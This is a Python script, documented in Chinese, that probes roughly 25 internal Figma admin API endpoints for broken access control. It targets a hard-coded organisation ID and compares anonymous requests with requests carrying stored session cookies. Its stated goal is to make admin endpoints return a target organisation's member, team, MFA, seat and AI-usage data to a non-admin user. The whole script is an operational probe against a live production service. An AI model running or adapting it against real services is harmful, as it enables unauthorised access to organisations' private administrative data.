"""Figma 内部管理接口探测（pagination_resolver / sinatra_resolver）

创造目标：让管理接口（org_admin/org_teams/plan_ai_usage 等）返回目标组织数据。
若接口只校验"登录了"而未校验"是管理员" → 普通用户拿到组织管理数据。

构造：匿名 + 登录态双态 GET，无参请求（响应错误信息推进参数链，不作参数猜测）。
接口路径全部来自 editor_apis.txt（确定性来源）。

判断标准：状态码/响应体差异 + 是否返回组织级数据。
"""
import json, sys, time
import requests

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

SESS = json.load(open(r"D:\scan\_figma_hunt\figma_session.json"))
CK = {c["name"]: c["value"] for c in SESS if c.get("name") and c.get("value")}
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36"}

APIS = [
    # pagination_resolver 管理面
    ("pagination_resolver/org_admin", "orgId=1484997479016537761"),
    ("pagination_resolver/org_admin_minimal_fields", "orgId=1484997479016537761"),
    ("pagination_resolver/org_teams", "orgId=1484997479016537761"),
    ("pagination_resolver/org_unassigned_teams", "orgId=1484997479016537761"),
    ("pagination_resolver/org_workspaces", "orgId=1484997479016537761"),
    ("pagination_resolver/org_idp_groups", "orgId=1484997479016537761"),
    ("pagination_resolver/org_discoverable_teams", "orgId=1484997479016537761"),
    ("pagination_resolver/admin_request_dashboard", ""),
    ("pagination_resolver/plan_ai_usage_by_users", ""),
    ("pagination_resolver/plan_ai_usage_by_users_v2", ""),
    ("pagination_resolver/user_group_members", "orgId=1484997479016537761"),
    ("pagination_resolver/user_groups_for_plan", "orgId=1484997479016537761"),
    ("pagination_resolver/unclaimed_domain_users", "orgId=1484997479016537761"),
    ("pagination_resolver/shared_with_you_resources", ""),
    ("pagination_resolver/templates_search", ""),
    # sinatra_resolver 管理面
    ("sinatra_resolver/admin_request_dashboard_row_count", ""),
    ("sinatra_resolver/org_admin_users_info", "orgId=1484997479016537761"),
    ("sinatra_resolver/org_member_count", "orgId=1484997479016537761"),
    ("sinatra_resolver/org_workspace_count", "orgId=1484997479016537761"),
    ("sinatra_resolver/plan_user_count", "orgId=1484997479016537761"),
    ("sinatra_resolver/plan_user_ai_usage_monthly", "orgId=1484997479016537761"),
    ("sinatra_resolver/assigned_seat_counts", "orgId=1484997479016537761"),
    ("sinatra_resolver/license_group_seat_counts", "orgId=1484997479016537761"),
    ("sinatra_resolver/org_mfa_member_info", "orgId=1484997479016537761"),
    ("sinatra_resolver/org_web_published_unprotected_count", "orgId=1484997479016537761"),
]

def probe(api, qs, cookies=None, label=""):
    url = f"https://www.figma.com/api/internal/livegraph/{api}" + (f"?{qs}" if qs else "")
    try:
        r = requests.get(url, cookies=cookies, headers=UA, timeout=12)
        body = r.text[:180].replace("\n", " ")
        return f"{r.status_code} | {body}"
    except Exception as e:
        return f"ERR {e}"

print("=== 匿名 vs 登录态 管理接口探测 ===")
for api, qs in APIS:
    anon = probe(api, qs)
    auth = probe(api, qs, CK)
    print(f"\n{api}")
    print(f"  ?{qs}")
    print(f"  匿名 : {anon}")
    print(f"  登录 : {auth}")
    time.sleep(0.3)
